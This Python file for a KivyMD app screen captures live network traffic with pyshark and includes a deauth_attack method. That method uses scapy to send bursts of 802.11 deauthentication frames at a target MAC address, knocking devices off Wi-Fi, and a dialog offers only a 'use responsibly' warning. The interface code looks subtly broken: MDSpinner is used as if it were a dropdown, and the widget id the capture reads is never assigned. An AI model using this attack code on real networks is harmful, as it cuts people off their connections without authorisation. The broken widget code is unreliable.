import pyshark
from scapy.layers.dot11 import RadioTap, Dot11
from scapy.sendrecv import sendp
from kivymd.uix.screen import MDScreen
from kivy.clock import Clock
from kivymd.uix.button import MDRaisedButton
from kivymd.uix.label import MDLabel
from kivymd.uix.spinner import MDSpinner
from kivymd.uix.dialog import MDDialog
from kivymd.uix.textfield import MDTextField
from utils import get_interfaces

class PySharkScreen(MDScreen):

    def on_pre_enter(self):
        # Populate the interface spinner
        interface_spinner = MDSpinner(
            text='Select Interface',
            values=get_interfaces(),
            pos_hint={'center_x': 0.5, 'center_y': 0.6}
        )
        self.add_widget(interface_spinner)

    def start_capture(self):
        interface = self.ids.interfaces_spinner.text
        self.run_pyshark(interface)

    def run_pyshark(self, interface):
        capture = pyshark.LiveCapture(interface=interface, monitor_mode=True)
        capture.apply_on_packets(self.packet_analysis)

    def packet_analysis(self, packet):
        try:
            protocol = packet.transport_layer
            source = packet.ip.src
            destination = packet.ip.dst
            info = f"Protocol: {protocol}, Source: {source}, Destination: {destination}\n"
            Clock.schedule_once(lambda dt: self.update_display(info), 0)
        except AttributeError:
            pass

    def update_display(self, info):
        packet_display_label = MDLabel(
            text=info,
            halign='center'
        )
        self.add_widget(packet_display_label)

    def show_deauth_warning(self):
        dialog = MDDialog(
            title='Warning',
            text='Deauthentication attack is a sensitive operation. Use responsibly!',
            size_hint=(0.8, 0.4)
        )
        dialog.open()

    def deauth_attack(self, target_mac, source_mac):
        packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=source_mac, addr3=source_mac)
        sendp(packet, iface=self.ids.interfaces_spinner.text, count=100, inter=0.1)

    # Additional methods as needed
